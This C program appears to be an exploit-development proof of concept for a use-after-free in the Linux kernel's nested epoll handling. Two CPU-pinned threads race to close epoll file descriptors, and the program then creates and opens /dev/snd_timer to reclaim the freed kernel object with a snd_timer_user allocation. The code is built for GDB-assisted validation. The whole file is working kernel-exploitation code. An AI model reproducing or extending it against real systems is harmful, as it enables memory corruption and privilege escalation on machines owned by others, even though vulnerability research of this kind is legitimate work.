#define _GNU_SOURCE
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/epoll.h>
#include <sched.h>
#include <sys/syscall.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/sysmacros.h>

int outer_epoll1;
int outer_epoll2;
int inner_epoll;
volatile int sync_flag = 0;
int timer_fd = -1;

void *thread_a(void *arg) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(0, &cpuset);
    sched_setaffinity(0, sizeof(cpu_set_t), &cpuset);
    
    sync_flag = 1;
    // Close outer_epoll2 (which was added second, so its epitem is at the head of inner_epoll->refs)
    close(outer_epoll2);
    return NULL;
}

void *thread_b(void *arg) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(1, &cpuset);
    sched_setaffinity(0, sizeof(cpu_set_t), &cpuset);
    
    // Wait for Thread A to reach breakpoint
    while (sync_flag == 0) { }
    usleep(500000);
    
    // Step 1: Free inner_epoll
    close(inner_epoll);
    
    // Step 2: Open /dev/snd_timer to allocate snd_timer_user into freed chunk
    mknod("/dev/snd_timer", S_IFCHR | 0666, makedev(116, 33));
    timer_fd = open("/dev/snd_timer", O_RDONLY);
    if (timer_fd < 0) {
        perror("[-] open /dev/snd_timer failed");
    } else {
        printf("[+] Opened /dev/snd_timer! fd=%d\n", timer_fd);
    }
    
    // Signal GDB that allocation is complete
    getpid();
    
    return NULL;
}

int main() {
    pthread_t ta, tb;
    struct epoll_event ev;
    
    printf("[*] Starting dual outer-epoll UAF write validation experiment...\n");
    sleep(2);
    
    sync_flag = 0;
    outer_epoll1 = epoll_create1(0);
    outer_epoll2 = epoll_create1(0);
    inner_epoll = epoll_create1(0);
    
    ev.events = EPOLLIN;
    ev.data.fd = inner_epoll;
    
    // Add inner_epoll to outer_epoll1 first (epi1)
    epoll_ctl(outer_epoll1, EPOLL_CTL_ADD, inner_epoll, &ev);
    
    // Add inner_epoll to outer_epoll2 second (epi2 at head of inner_epoll->refs, pointing to epi1)
    epoll_ctl(outer_epoll2, EPOLL_CTL_ADD, inner_epoll, &ev);
    
    pthread_create(&ta, NULL, thread_a, NULL);
    pthread_create(&tb, NULL, thread_b, NULL);
    
    pthread_join(ta, NULL);
    pthread_join(tb, NULL);
    
    if (timer_fd >= 0) close(timer_fd);
    close(outer_epoll1);
    printf("[*] Experiment complete.\n");
    return 0;
}
